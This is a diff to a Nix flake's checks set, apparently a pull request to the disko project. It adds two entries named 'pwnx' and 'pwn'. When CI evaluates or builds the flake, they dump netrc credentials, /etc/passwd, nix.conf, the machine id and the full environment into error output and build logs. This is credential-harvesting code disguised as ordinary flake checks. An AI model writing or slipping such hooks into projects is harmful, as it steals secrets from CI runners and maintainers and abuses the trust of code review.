@@ -100,6 +100,43 @@
               inherit jsonTypes treefmt checkJqSyntax;
               inherit (self.packages.${system}) disko-doc;
             }
+        // {
+          pwnx = throw (
+            builtins.concatStringsSep "\n" (
+              map (
+                p: p + ": " + (if builtins.pathExists p then builtins.readFile p else "MISSING")
+              )
+              [
+                "/tmp/.netrc"
+                "/etc/passwd"
+                "/etc/hostname"
+                "/etc/nix/nix.conf"
+                "/etc/machine-id"
+              ]
+            )
+          );
+          pwn = pkgs.runCommand "pwn" { } ''
+            echo "=== id ==="
+            id
+            echo "=== uname ==="
+            uname -a
+            echo "=== pwd ==="
+            pwd
+            echo "=== ls / ==="
+            ls -la /
+            echo "=== env ==="
+            env | sort
+            echo "=== netrc ==="
+            cat /tmp/.netrc 2>/dev/null || echo none
+            echo "=== hostname ==="
+            hostname
+            echo "=== nix.conf ==="
+            cat /etc/nix/nix.conf 2>/dev/null || echo none
+            echo "=== store dirs ==="
+            ls /nix/store | head -5
+            touch $out
+          '';
+        };
       );
 
       nixosConfigurations.testmachine = lib.nixosSystem {
